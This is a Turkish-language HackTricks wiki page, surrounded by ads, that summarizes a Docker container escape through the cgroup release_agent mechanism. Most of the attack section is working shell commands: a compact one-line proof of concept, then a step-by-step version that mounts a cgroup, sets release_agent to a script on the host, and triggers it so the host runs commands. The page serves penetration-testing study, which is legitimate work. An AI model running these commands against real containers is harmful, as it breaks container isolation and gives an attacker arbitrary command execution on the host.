# Docker release\_agent cgroups kaçışı

{% hint style="success" %}
AWS Hacking'ı öğrenin ve uygulayın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarını paylaşarak PR göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
{% endhint %}

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io), şirketin veya müşterilerinin **hırsız kötü amaçlı yazılımlar** tarafından **kompromize edilip edilmediğini** kontrol etmek için **ücretsiz** işlevler sunan **dark-web** destekli bir arama motorudur.

WhiteIntel'in asıl amacı, bilgi çalan kötü amaçlı yazılımlardan kaynaklanan hesap ele geçirmeleri ve fidye yazılımı saldırılarıyla mücadele etmektir.

Websitesini ziyaret edebilir ve motorlarını **ücretsiz** deneyebilirsiniz:

{% embed url="https://whiteintel.io" %}

***

**Daha fazla ayrıntı için** [**orijinal blog gönderisine**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)** başvurun.** Bu sadece bir özet:

Orijinal PoC:
```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```
**Kavramın Kanıtı (PoC)**, cgroups'ı sömürmek için bir yöntemi gösterir. Bu yöntem, bir `release_agent` dosyası oluşturarak ve onun çağrılmasını tetikleyerek konteyner ana bilgisayarında keyfi komutları yürütmeyi amaçlar. İşte dahil olan adımların ayrıntılı açıklaması:

1. **Ortamı Hazırlama:**
* `cgroup` için bir bağlama noktası olarak hizmet verecek `/tmp/cgrp` adlı bir dizin oluşturulur.
* RDMA cgroup denetleyicisi bu dizine bağlanır. RDMA denetleyicisinin bulunmaması durumunda, alternatif olarak `memory` cgroup denetleyicisinin kullanılması önerilir.
```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```
2. **Çocuk Cgroup'u Kurulumu:**
* Bağlanmış cgroup dizini içinde "x" adında bir çocuk cgroup oluşturulur.
* "x" cgroup için bildirimler, notify\_on\_release dosyasına 1 yazılarak etkinleştirilir.
```shell
echo 1 > /tmp/cgrp/x/notify_on_release
```
3. **Yayınlayıcı Etkeni Yapılandırma:**
* Konteynerin ana makinedeki yolu /etc/mtab dosyasından elde edilir.
* Ardından cgroup'ın release\_agent dosyası, elde edilen ana makine yolunda bulunan /cmd adlı bir betiği çalıştırmak üzere yapılandırılır.
```shell
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
4. **/cmd Betiği Oluşturun ve Yapılandırın:**
* /cmd betiği konteyner içinde oluşturulur ve ps aux komutunu çalıştırmak üzere yapılandırılır, çıktı /output adlı bir dosyaya konteyner içinde yönlendirilir. Ana bilgisayar üzerinde /output'un tam yolu belirtilir.
```shell
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```
5. **Saldırıyı Tetikle:**
* Bir işlem "x" çocuk cgroup içinde başlatılır ve hemen sonlandırılır.
* Bu, `release_agent` (the /cmd script) tetikler ve ana makinede ps aux komutunu çalıştırır ve çıktıyı konteyner içinde /output'a yazar.
```shell
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```
### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io), şirketin veya müşterilerinin **hırsız kötü amaçlı yazılımlar** tarafından **kompromize edilip edilmediğini** kontrol etmek için **ücretsiz** işlevler sunan **dark-web** destekli bir arama motorudur.

WhiteIntel'in asıl amacı, bilgi çalan kötü amaçlı yazılımlardan kaynaklanan hesap ele geçirmeleri ve fidye yazılımı saldırılarıyla mücadele etmektir.

Websitesini ziyaret edebilir ve **ücretsiz** olarak motorlarını deneyebilirsiniz:

{% embed url="https://whiteintel.io" %}

{% hint style="success" %}
AWS Hacking'ı öğrenin ve uygulayın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'ı öğrenin ve uygulayın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarını paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
{% endhint %}
